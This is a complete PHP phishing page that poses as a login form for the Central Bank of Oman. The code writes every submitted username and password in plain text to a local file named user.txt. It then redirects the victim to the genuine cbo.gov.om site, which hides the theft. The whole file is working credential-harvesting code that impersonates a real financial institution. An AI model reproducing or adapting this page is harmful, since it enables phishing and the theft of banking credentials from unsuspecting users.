<?php
// Start session
session_start();

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if username and password are provided
    if(isset($_POST["username"]) && isset($_POST["password"])) {
        // Get username and password from POST data
        $username = $_POST["username"];
        $password = $_POST["password"];

        // Save username and password to user.txt (replace with secure storage method)
        $file = fopen("user.txt", "a");
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);

        // Redirect to CBO website using JavaScript
        echo "<script>window.location.href = 'https://cbo.gov.om';</script>";
        exit;
    } else {
        // Username or password not provided
        $error = "Please enter username and password.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to CBO</title>
</head>
<body>
    <h1>Login to Central Bank of Oman</h1>
    <?php if(isset($error)) { ?>
        <p style="color: red;"><?php echo $error; ?></p>
    <?php } ?>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
